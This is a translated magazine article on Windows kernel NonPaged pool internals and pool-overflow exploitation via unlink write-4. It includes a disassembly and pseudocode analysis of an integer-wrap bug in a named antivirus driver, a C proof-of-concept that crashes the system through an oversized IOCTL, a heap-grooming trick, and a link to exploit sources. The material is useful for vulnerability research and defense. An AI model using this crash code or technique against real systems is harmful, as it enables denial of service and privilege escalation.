<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Kernel Pool Overflow: from theory to practice</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The Windows kernel has always been a tasty morsel for a hacker, especially when there are complete methods for exploiting it, leading to elevation of ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Kernel Pool Overflow: from theory to practice</h1><div class="post__text post__text-html js-mediator-article">  The Windows kernel has always been a tasty morsel for a hacker, especially when there are complete methods for exploiting it, leading to elevation of rights.  Considering the fact that over the past few years, the number of vulnerabilities associated with the overflow of the dynamic memory of the kernel has increased dramatically, I became actively interested in this direction and, to my own surprise, eventually dug up so much material that it would not suffice for one 0day bug. <br><br><img src="https://habrastorage.org/storage/habraeffect/9e/ba/9ebaf88eec9bceeebfae3b38b63958fa.jpg" alt="Visual nuclear shellcode :)"><br><a name="habracut"></a><br><br><h3>  The urgency of the problem </h3><br>  Memory Management technology is one of the most important in the work of the kernel.  The vulnerabilities of this mechanism are perhaps also the most terrible and, at the same time, relevant.  They are the main incentive to create all sorts of different types of protection, such as safe unlinking.  This article will discuss in detail some aspects, both theoretical and practical, of the exploitation of a dynamic kernel memory overflow. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      To begin, I will point the finger at the brightest representatives of the vulnerabilities of this caste: <br><ul><li>  <b>ms08-001</b> - IGMPv3 Kernel Pool Overflow - remote overflow in tcpip.sys; </li><li>  <b>ms09-006</b> - vulnerability in processing certain wmf / emf entries associated with the win32k.sys flaw; </li><li>  <b>ms10-058</b> - integer overflow vulnerability leading to pool overflow in tcpip.sys. </li></ul><h3>  Kernel Memory Allocation Overview </h3><br>  As in any self-respecting operating system, Windows (and more precisely, its kernel) provides some functions for allocating / freeing memory.  Virtual memory consists of blocks called pages.  In Intel x86 architecture, the page size is 4096 bytes.  However, most requests for memory allocation are smaller than a page.  Therefore, kernel functions, such as ExAllocatePoolWithTag and ExFreePoolWithTag, reserve unused memory for later allocation.  Internal functions directly interact with hardware every time a page is involved.  All these procedures are quite complex and delicate, which is why they are implemented in the kernel. <br><br><h3>  Differences between Paged and NonPaged pool </h3><br>  The system core memory is divided into two different pools.  This trick was invented to allocate the most frequently used memory blocks.  The system should know which pages are most in demand, and which pages can be temporarily abandoned (logical, right?).  Paged pool can be saved in RAM or pushed into the file system (swap).  NonPaged pool is used for important tasks, it exists only in RAM and for each IRQL level. <br><br>  The pagefile.sys file contains paged memory.  In the recent past, he was already falling victim to an attack, during which unsigned code was introduced into the Vista kernel.  Among the solutions discussed, it was proposed to disable paged memory.  Joanna Rutkowska advertised such a solution as safer than others, although the result was a small loss of physical memory.  Microsoft refuses to directly access the disk, which confirms the importance of such features of the Windows kernel as Paged and NonPaged pools.  This article is written with a focus on NonPaged pool, as the processing of the Paged-Pool is completely different.  NonPaged pool can be considered as a more or less typical implementation of heap.  Detailed information about system pools is available in Microsoft Windows Internals. <br><br><h3>  NonPaged pool table </h3><br>  Allocation algorithm should quickly distribute the most frequently used volumes.  Therefore, there are three different tables, each of which allocates memory of a specific range.  I found this structure in most memory management algorithms.  Reading memory blocks from devices takes some time, so in Windows algorithms there is a balance between the response speed and the optimal memory allocation.  Response time is reduced if memory blocks are saved for later allocation.  On the other hand, redundant memory backups can affect performance. <br>  The table is a separate way to store blocks of memory.  We will look at each table and its location. <br><br>  <b>NonPaged lookaside</b> is a table assigned to each processor and working with memory sizes less than or equal to 256 bytes.  Each processor has a control register (PCR), which stores the service data of the processor - the level IRQL, GDT, IDT.  The registry extension is called the control region (PCRB) and contains lookaside tables.  The following windbg dump represents the structure of such a table: <br><br><img src="https://habrastorage.org/storage/habraeffect/83/0f/830ffaad684565fe21de2c58578438a7.jpg" alt="Structure dumps in windbg"><br><h6>  Structure dumps in windbg </h6><br>  Lookaside tables provide the fastest reads of memory blocks compared to other types.  For such an optimization, the delay time is very important, and a simply linked list (which is implemented in Lookaside) is much more efficient than a doubly linked one.  The ExInterlockedPopEntrySList function is used to select an entry from the list using the hardware ‚Äúlock‚Äù instruction.  PPNPagedLookasideList is the aforementioned Lookaside table.  It contains two Lookaside-lists: P and L. The ‚Äúdepth‚Äù field of the GENERAL_LOOKASIDE structure determines how many entries can be in the ListHead list.  The system regularly updates this parameter using various counters.  The update algorithm is based on the processor number and is not the same for P and L. In the P list, the ‚Äúdepth‚Äù field is updated more often than in the L list, because P is optimized for very small blocks. <br><br>  The second table depends on the number of processors and how the system manages them.  This method of memory allocation will be used if the volume is less than or equal to 4080 bytes, or if the lookaside-search returned no results.  Even if the target table changes, it will have the same POOL_DESCRIPTOR structure.  In the case of a single processor, the PoolVector variable is used to read the NonPagedPoolDescriptor pointer.  In the case of many processors, the ExpNonPagedPoolDescriptor table contains 16 slots with pool descriptions.  The PCRB of each processor points to the KNODE structure.  A node can be associated with more than one processor and contains the "color" field used as a list for ExpNonPagedPoolDescriptor.  The following diagrams illustrate this algorithm: <br><br><img src="https://habrastorage.org/storage/habraeffect/a5/7f/a57f9efdd4f785b95114e00e87f38100.jpg" alt="Pool description with one processor"><br><h6>  Pool description with one processor </h6><br><img src="https://habrastorage.org/storage/habraeffect/46/f7/46f7b84e23f451f976af771a0d1f01ca.jpg" alt="Pool Description with Multiple Processors"><br><h6>  Pool Description for Multiple Processors </h6><br>  The kernel defines the global variable ExpNumberOfNonPagedPools if this table is used by multiple processors.  It must contain the number of processors. <br><br>  The following windbg dump displays the POOL_DESCRIPTOR structure: <br><br><img src="https://habrastorage.org/storage/habraeffect/df/f9/dff9a14d4a5d84fba0239651f5fc55a7.jpg" alt="POOL_DESCRIPTOR structure"><br><h6>  POOL_DESCRIPTOR structure </h6><br>  The spinlock queue has synchronization implemented;  part of the HAL library is used to prevent conflicts in the pool descriptor.  This procedure allows only one processor and one thread to get simultaneous access to the record from the pool descriptor.  The HAL library varies across architectures.  For the default pool handle, the main NonPaged spinlock is locked (LockQueueNonPagedPoolLock).  And if it is not locked, then a separate spinlock queue is created for it. <br><br>  The third and last table is used by processors for processing memory over 4080 bytes.  MmNonPagedPoolFreeListHead is also used if other tables have run out of memory.  Access to this table occurs when accessing the main queue NonPaged spinlock, also called LockQueueNonPagedPoolLock. <br><br>  During the release of a smaller block of memory, ExFreePoolWithTag combines it with the previous and next free blocks.  So a block of a page size or more can be created.  In this case, the block is added to the MmNonPagedPoolFreeListHead table. <br><br><h3>  Algorithms for allocating and freeing memory </h3><br>  The memory distribution by the kernel in different versions of the OS almost does not change, but this algorithm is no less complicated than the heap user processes.  In this part of the article I want to illustrate the basics of the behavior of tables in the course of procedures for allocating and freeing memory.  Many details, such as synchronization mechanisms, will be intentionally omitted.  These algorithms will help in explaining the method and understanding the basics of memory allocation in the kernel. <br><br>  Allocation algorithm in NonPaged pool (ExAllocatePoolWithTag): <br><br><img src="https://habrastorage.org/storage/habraeffect/3a/0e/3a0e54255d818ec8373b25a3e8885540.jpg" alt="Visual Allocation Algorithm"><br><h6>  Visual Allocation Algorithm </h6><br>  Algorithm of release of NonPaged pool (ExFreePoolWithTag): <br><img src="https://habrastorage.org/storage/habraeffect/2e/68/2e6823bd48fe1ce39381dba5beea3806.jpg" alt="Accordingly, the memory allocation algorithm"><br><h6>  Accordingly, the memory allocation algorithm </h6><br><br><h3>  From the blue screen of death to the fulfillment of desires </h3><br>  When the dynamic memory overflows, the metadata of other allocated blocks are usually overwritten, which basically leads to several BugChecks (or simply BSODs): <br><br>  <b>BAD_POOL_HEADER</b> : Called in ExFreePoolWithTag code if the PreviousSize of the next chunk is not BlockSize of the current chunk. <br><br> <code>BAD_POOL_HEADER (19) <br> The pool is already corrupt at the time of the current request. This may or may not be due to the caller. The internal pool links must be walked to figure out a possible cause of the problem, and then special pool applied to the suspect tags or the driver verifier to a suspect driver. <br> Arguments: <br> Arg1: 00000020, a pool block header size is corrupt. <br> Arg2: 812c1000, The pool entry we were looking for within the page. <b>&lt;----  </b> <br> Arg3: 812c1fc8, The next pool entry. <b>&lt;----  ,    </b> <br> Arg4: 0bf90000, (reserved)</code> <br> <br>  <b>DRIVER_CORRUPTED_EXPOOL:</b> Called in ExFreePoolWithTag code if a Page Fault exception occurred during unlink. <br><br> <code>DRIVER_CORRUPTED_EXPOOL (c5) <br> An attempt was made to access a pageable (or completely invalid) address at an <br> interrupt request level (IRQL) that is too high. This is caused by drivers that have corrupted the system pool. Run the driver verifier against any new (or suspect) drivers, and if that doesn't turn up the culprit, then use gflags to enable special pool. <br> Arguments: <br> Arg1: 43434343, memory referenced <b>&lt;-----    Blink'a</b> <br> Arg2: 00000002, IRQL <br> Arg3: 00000001, value 0 = read operation, 1 = write operation <br> Arg4: 80544d06, address which referenced memory</code> <br> <br>  <b>BAD_POOL_CALLER:</b> Called in ExFreePoolWithTag code, if the chunk you are trying to free is already freed. <br><br>  Let's take a closer look at the chunk header (metadata): <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">//   typedef struct _POOL_HEADER { union { struct { USHORT PreviousSize : 9; USHORT PoolIndex : 7; USHORT BlockSize : 9; USHORT PoolType : 7; } ULONG32 Ulong1; } union { struct _EPROCESS* ProcessBilled; ULONG PoolTag; struct { USHORT AllocatorBackTraceIndex; USHORT PoolTagHash; } } } POOL_HEADER, *POOL_HEADER; // sizeof(POOL_HEADER) == 8</span></span></code> </pre> <br>  The values ‚Äã‚Äãof PreviousSize, BlockSize are calculated as follows: <br><br><pre> <code class="cpp hljs">PreviousSize = (____ + <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(POOL_HEADER)) / <span class="hljs-number"><span class="hljs-number">8</span></span> BlockSize = (___ + <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(POOL_HEADER)) / <span class="hljs-number"><span class="hljs-number">8</span></span></code> </pre> <br><br>  If the PoolType value is zero, then such a chunk is freed, and after the header comes the structure nt! _LIST_ENTRY. <br><br> <code>kd&gt; dt nt!_LIST_ENTRY <br> +0x000 Flink : Ptr32 _LIST_ENTRY <br> +0x004 Blink : Ptr32 _LIST_ENTRY</code> <br> <br><h3>  Exploitation </h3><br>  The chunk release algorithm works in such a way that if there is a free chunk after the release, the merge occurs, that is, one of the two free chunks is glued together.  This is done by a simple unlink operation. <br><br>  Remove entry entry from doubly linked list <br><br> <code>PLIST_ENTRY b,f; <br> f=entry-&gt;Flink; <br> b=entry-&gt;Blink; <br> b-&gt;Flink=f; <br> f-&gt;Blink=b;</code> <br> <br>  This leads to the rewriting of 4 bytes at the monitored address: <br><br> <code>*()= <br> *(+4)=</code> <br> <br><img src="https://habrastorage.org/storage/habraeffect/d6/22/d622466a72142625bc7e736e1ca45e31.jpg" alt="Simple scheme of the algorithm that we have implemented"><br><h6>  Simple scheme of the algorithm that we have implemented </h6><br><br><h3>  Practice! </h3><br>  With sufficient knowledge, consider the vulnerability in the driver of a single antivirus product. <br><br> <code>.text:00016330 mov cx, [eax] <b>; eax      </b> <br> .text:00016333 inc eax <br> .text:00016334 inc eax <br> .text:00016335 test cx, cx <br> .text:00016338 jnz short loc_16330 <br> .text:0001633A sub eax, edx <br> .text:0001633C sar eax, 1 <br> .text:0001633E lea eax, [eax+eax+50h] ;  UNICODE  + 0x50  <br> .text:00016342 movzx edi, ax <b>;   ,   WORD</b> <br> .text:00016345 <br> .text:00016345 loc_16345:; <br> .text:00016345 movzx eax, di <br> .text:00016348 push ebx <br> .text:00016349 xor ebx, ebx <br> .text:0001634B cmp eax, ebx <br> .text:0001634D jz short loc_16359 <br> .text:0001634F push eax; -  <br> .text:00016350 push ebx;  (NonPaged) <br> .text:00016351 call ds:ExAllocatePool <b>;       chunk'a</b> <br> .text:00016357 mov ebx, eax <br> [..] <br> .text:000163A6 movzx esi, word ptr [edx] <br> .text:000163A9 mov [eax+edx], si <b>;     </b> <br> .text:000163AD inc edx <br> .text:000163AE inc edx <br> .text:000163AF test si, si <br> [..] <br> .text:000163F5 push ebx; P <br> .text:000163F6 call sub_12A43 <br> .text:00012A43 sub_12A43 proc near; CODE XREF: sub_12C9A+5Cp <br> .text:00012A43; sub_12C9A+79p ... <br> .text:00012A43 <br> .text:00012A43 P = dword ptr 4 <br> .text:00012A43 <br> .text:00012A43 cmp esp+P], 0 <br> .text:00012A48 jz short locret_12A56 <br> .text:00012A4A push 0; Tag <br> .text:00012A4C push [esp+4+P]; P <br> .text:00012A50 call ds:ExFreePoolWithTag <b>; , write4 </b></code> <br> <br>  <b>C-like pseudocode</b> <br><pre> <code class="cpp hljs">len = wsclen(attacker_controlled); total_len = (<span class="hljs-number"><span class="hljs-number">2</span></span>*len + <span class="hljs-number"><span class="hljs-number">0x50</span></span>) ; size_2_alloc = (WORD)total_len; <span class="hljs-comment"><span class="hljs-comment">// integer wrap!!! mem = ExAllocatePool(size_2_alloc); .... wcscpy(mem, attacker_controlled);//     ... ExFreePool(mem); //  ,   ,   ,   ,      ,     ,    ring0-shellcode</span></span></code> </pre> <br>  As can be seen from the code, the vulnerability is related to the casting of integer types, which leads to the fact that the size for the unicode string will be calculated incorrectly.  All this will lead to overflow, if you pass a buffer with a unicode string greater than 0xffff bytes to the driver. <br><br>  <b>Simple code to play BSoD</b> <br><pre> <code class="cpp hljs">hDevice = CreateFileA(<span class="hljs-string"><span class="hljs-string">"\\\\.\\KmxSbx"</span></span>, GENERIC_READ|GENERIC_WRITE, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, OPEN_EXISTING, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>); inbuff = (<span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *)<span class="hljs-built_in"><span class="hljs-built_in">malloc</span></span>(<span class="hljs-number"><span class="hljs-number">0x1C000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!inbuff){ <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"malloc failed!\n"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; } <span class="hljs-built_in"><span class="hljs-built_in">memset</span></span>(inbuff, <span class="hljs-string"><span class="hljs-string">'A'</span></span>,<span class="hljs-number"><span class="hljs-number">0x1C000</span></span><span class="hljs-number"><span class="hljs-number">-1</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">memset</span></span>(buff+<span class="hljs-number"><span class="hljs-number">0x11032</span></span>, <span class="hljs-number"><span class="hljs-number">0x00</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>);<span class="hljs-comment"><span class="hljs-comment">//end of unicode, size to allocate 0xff0 ioctl = 0x88000080; first_dword = 0x400; memcpy(buff, &amp;first_dword, sizeof(DWORD)); DeviceIoControl(hDevice, ioctl, (LPVOID)inbuff, 0x1C000, (LPVOID)inbuff, 0x100, &amp;cb,NULL);</span></span></code> </pre> <br>  The exploitation of this vulnerability is not as simple as it may seem at first glance.  Here there are some limitations, namely - overflow (writing beyond the chunk border) huge (more than 0xffff), which potentially leads to a blue screen even before ExFreePoolWithTag execution (and, therefore, to replace the merge pointers): <br><br> <code>PAGE_FAULT_IN_NONPAGED_AREA (50) <br> Invalid system memory was referenced. This cannot be protected by try-except, <br> it must be protected by a Probe. Typically the address is just plain bad or it <br> is pointing at freed memory. <br> Arguments: <br> Arg1: fe8aa000, memory referenced. <br> Arg2: 00000001, value 0 = read operation, 1 = write operation. <br> Arg3: f0def3a9, If non-zero, the instruction address which referenced the bad memory address. <br> Arg4: 00000000, (reserved) <br> eax=00029fa8 ebx=fe8a7008 ecx=00000008 edx=fe880058 esi=00004141 edi=fe87d094 <br> eip=f0def3a9 esp=f0011b78 ebp=f0011bac iopl=0 nv up ei pl nz na pe nc <br> cs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010206 <br> KmxSbx+0x63a9: <br> f0def3a9 66893410 mov word ptr [eax+edx],si ds:0023:fe8aa000=???? <b>&lt;----   ,   </b> </code> <br> <br>  When overwriting memory, we can rewrite the data that are pointers to any nuclear structures, which can lead to the most unexpected consequences (the next BSoD). <br><br>  To improve the operational efficiency of this vulnerability, we use the following trick: create N threads that call DeviceIoControl, with such parameters that with some probability N the number of blocks of a certain length (0xff0 in this example) are allocated, then released - this gives us a chance that overflow we will not get a blue screen like Page Fault (PAGE_FAULT_IN_NONPAGED_AREA).  For a sample code with detailed comments, search on our DVD. <br><br><img src="https://habrastorage.org/storage/habraeffect/9e/ba/9ebaf88eec9bceeebfae3b38b63958fa.jpg" alt="Visual nuclear shellcode :)"><br><h6>  Visual nuclear shellcode :) </h6><br><h3>  findings </h3><br>  At parting, I can only say that there is very little information on the Internet about operating the Kernel Pool Overflow.  It also grieves that there are no working exploits in public, which creates a kind of delusion that it is very difficult to exploit memory overflow in the core, and if possible, the maximum outcome of the atrocities is a normal BSoD. <br><br>  In this article, the authors tried to show with a real example that, by connecting ingenuity, one can improve the stability of the methods for exploiting such vulnerabilities. <br>  In future articles we will talk about more complex aspects of the operation of Kernel Pool Overflow, which, of course, exist and are waiting in the wings :).  Stay tuned! <br><br><h6>  For a sample code with detailed comments, search on our DVD or <a href="http://narod.ru/disk/205778001/xa_143_burim_yadro_sources.7z.html">here</a> . </h6><br><h6>  Related Links </h6><ul><li>  <a href="http://phrack.org/issues.html%3Fissue%3D65%26id%3D4">Stealth hooking: Another way to subvert the Windows kernel</a> </li><li>  <a href="http://invisiblethings.org/papers/joanna%2520rutkowska%2520-%2520subverting%2520vista%2520kernel.ppt">Subtitling VistaTM Kernel For Fun And Profit by Joanna Rutkowska</a> </li><li>  <a href="http://theinvisiblethings.blogspot.com/2006/10/vista-rc2-vs-pagefile-attack-and-some.html">Vista RC2 vs.</a>  <a href="http://theinvisiblethings.blogspot.com/2006/10/vista-rc2-vs-pagefile-attack-and-some.html">pagefile attack by Joanna Rutkowska</a> </li><li>  <a href="http://blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt">Windows Heap Overflows - David Litchfield</a> </li></ul><br>  <i>Journal Hacker, <a href="http://www.xakep.ru/articles/magazine/default.asp">December (12) 143</a></i> <i><br></i>  <i>Nikita Tarakanov (CISS Research Team)</i> <i><br></i>  <i>Alexander Bazhanyuk</i> <br><br>  Subscribe to "Hacker" <br><ul><li>  <a href="http://bit.ly/habr_subscribe_paper">1 999 .</a>  <a href="http://bit.ly/habr_subscribe_paper">for 12 numbers of paper version</a> </li><li>  <a href="http://bit.ly/digital_xakep">1249r.</a>  <a href="http://bit.ly/digital_xakep">for an annual subscription to iOS / iPad (Android'a release soon!)</a> </li><li>  <a href="http://bit.ly/habr_android">"Hacker" on Android</a> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/108618/">https://habr.com/ru/post/108618/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../108611/index.html">Grails, jQuery, AJAX: do anchor-navigation. Part 1</a></li>
<li><a href="../108612/index.html">A new campaign against Flash advertising has been launched on the Internet.</a></li>
<li><a href="../108614/index.html">The purest GaN crystals grown in Poland</a></li>
<li><a href="../108615/index.html">The difficulties of manufacturing processors</a></li>
<li><a href="../108617/index.html">Ideology and problems of developing financial systems. Part 1</a></li>
<li><a href="../108619/index.html">Results of Open Source Awards 2010</a></li>
<li><a href="../108621/index.html">The world record in 3DMark06 is conquered by Russian overclockers!</a></li>
<li><a href="../108622/index.html">Interception of function calls in Linux or the simplest firewall do it yourself</a></li>
<li><a href="../108627/index.html">Two flash drives and USB hub</a></li>
<li><a href="../108629/index.html">Interview with reiser4 developer Edward Shishkin</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>